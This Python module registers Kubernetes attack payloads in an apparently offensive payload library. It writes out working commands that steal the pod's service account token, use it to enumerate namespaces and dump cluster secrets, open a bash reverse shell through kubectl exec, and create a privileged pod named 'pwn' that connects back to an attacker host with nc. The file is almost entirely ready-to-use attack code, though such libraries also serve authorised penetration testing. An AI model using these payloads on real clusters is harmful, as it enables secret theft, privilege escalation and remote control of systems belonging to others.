"""Kubernetes attack payloads — enumeration, SA token theft, pod exec."""

from payloadforge.payloads.registry import register

register(
    "k8s_sa_token_steal",
    "cloud", "bash",
    "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
    "Read the mounted service account token from inside a pod.",
    testable=False,
    test_note="Only works inside a Kubernetes pod. Will fail on a Linux host without the mount.",
    tags=["kubernetes", "token"],
)

register(
    "k8s_api_enum",
    "cloud", "bash",
    "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt; curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces",
    "Enumerate namespaces using the pod's own service account token.",
    testable=False,
    test_note="Requires running inside a Kubernetes pod.",
    tags=["kubernetes", "recon"],
)

register(
    "k8s_secret_dump",
    "cloud", "bash",
    "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt; curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/secrets",
    "Dump cluster secrets using the pod's SA token (if RBAC allows).",
    testable=False,
    test_note="Requires running inside a K8s pod with secrets read permission.",
    tags=["kubernetes", "secrets"],
)

register(
    "k8s_exec_reverse",
    "cloud", "bash",
    "kubectl exec -it PODNAME -- /bin/sh -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
    "Exec a reverse shell into an existing pod via kubectl. Replace PODNAME.",
    testable=False,
    test_note="Requires kubectl configured + pods/exec permission.",
    tags=["kubernetes", "exec", "reverse"],
)

register(
    "k8s_curl_exec",
    "cloud", "bash",
    "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt; NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace); curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" -X POST https://kubernetes.default.svc/api/v1/namespaces/$NS/pods -d '{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"pwn\"},\"spec\":{\"containers\":[{\"name\":\"c\",\"image\":\"busybox\",\"command\":[\"sh\",\"-c\",\"nc {lhost} {lport} -e /bin/sh\"],\"securityContext\":{\"privileged\":true}}]}}'",
    "Create a privileged pod that connects back to you — via the K8s API and the pod's own SA token.",
    testable=False,
    test_note="Requires pods/create permission in the current namespace.",
    tags=["kubernetes", "pod-create", "reverse"],
)
